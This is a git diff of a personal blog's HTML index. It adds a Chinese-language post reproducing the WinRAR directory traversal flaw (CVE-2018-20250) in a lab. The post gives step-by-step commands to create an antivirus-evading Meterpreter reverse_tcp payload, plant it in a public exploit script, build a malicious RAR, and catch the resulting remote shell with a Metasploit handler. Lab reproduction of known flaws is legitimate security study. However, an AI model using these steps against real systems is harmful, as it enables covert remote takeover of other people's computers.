@@ -62,6 +62,69 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-WinRAR目录穿越漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/24/WinRAR目录穿越漏洞复现/" class="article-date">
+  <time datetime="2019-03-24T06:52:19.258Z" itemprop="datePublished">2019-03-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>WinRAR目录穿越漏洞复现</p>
+<ol>
+<li>使用Metasploit生成Payload</li>
+</ol>
+<p>（1）在kali Linux环境中打开终端并且输入msfconsole命令启动Metasploit</p>
+<img src="/2019/03/24/WinRAR目录穿越漏洞复现/1.png">
+<p>（2）在Metasploit中输入命令use evasion/windows/windows_defender_exe进行操作对象切换，再输入命令show info 查看详细信息。</p>
+<img src="/2019/03/24/WinRAR目录穿越漏洞复现/2.png">
+<p>再输入命令set filename WinRAR.exe和命令 set payload windows/meterprerer/reverse_tcp</p>
+<p>之后输入show options查看配置</p>
+<img src="/2019/03/24/WinRAR目录穿越漏洞复现/3.png">
+<p>（3）使用命令set lhost +kali的IP地址和命令set lport +端口号对IP地址和端口进行修改</p>
+<p>修改后输入命令run运行.</p>
+<img src="/2019/03/24/WinRAR目录穿越漏洞复现/4.png">
+<p>输入show options进行查看，如下图所示：</p>
+<img src="/2019/03/24/WinRAR目录穿越漏洞复现/5.png">
+<p>（4）输入命令exit退出Metasploit</p>
+<p>2.生成恶意程序</p>
+<p>（1）cd /root/Desktop</p>
+<p>git clone <a href="https://github.com/WyAtu/CVE-2018-20250.git" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250.git</a></p>
+<p>下载exp</p>
+<img src="/2019/03/24/WinRAR目录穿越漏洞复现/6.png">
+<p>（2）cd CVE-2018-20250切换页面CVE-2018-20250</p>
+<p>cp /root/.msf4/local/WinRAR.exe ./ 复制文件<br>vim exp.py进行编辑，将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe”</p>
+<img src="/2019/03/24/WinRAR目录穿越漏洞复现/7.png">
+<p>（3）将CVE-2018-20250文件夹复制到Windows10中</p>
+<p>执行python exp.py命令，生成恶意程序test.rar</p>
+<img src="/2019/03/24/WinRAR目录穿越漏洞复现/8.png">
+<p>3.将test.rar复制到Windows7上，解压</p>
+<p>4.在kali中使用Metasploit对靶机进行监听</p>
+<p>在kali 中输入以下命令</p>
+<p>msfconsole<br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>show options<br>set lhost +kali所在ip地址<br>set lport +自己所设端口<br>run</p>
+<ol start="5">
+<li><p>在靶机上运行所生成的恶意程序</p>
+<p>在解压的文件夹中选择hi.exe文件，让它运行，此时kali 终端会收到会话，获取了靶机的权限。</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/24/WinRAR目录穿越漏洞复现/" data-id="cjtmkrth80001b8uz6jz0bsej" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-使用github搭建个人博客" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/03/17/使用github搭建个人博客/" class="article-date">
@@ -94,7 +157,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/17/使用github搭建个人博客/" data-id="cjtmk918p000154uzlfdpj6vz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/03/17/使用github搭建个人博客/" data-id="cjtmkrthe0003b8uz6v3cbc8q" class="article-share-link">Share</a>
       
       
     </footer>
@@ -133,7 +196,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/17/2019-03-16-使用Github搭建个人博客/" data-id="cjtmk918j000054uz6uyxoxyx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/03/17/2019-03-16-使用Github搭建个人博客/" data-id="cjtmkrthb0002b8uzzlisud9p" class="article-share-link">Share</a>
       
       
     </footer>
@@ -178,7 +241,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/17/hello-world/" data-id="cjtmk918r000254uzie7f9dqi" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/03/17/hello-world/" data-id="cjtmkrth20000b8uzqr1nmmlk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -217,6 +280,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/03/24/WinRAR目录穿越漏洞复现/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2019/03/17/使用github搭建个人博客/">使用github搭建个人博客</a>
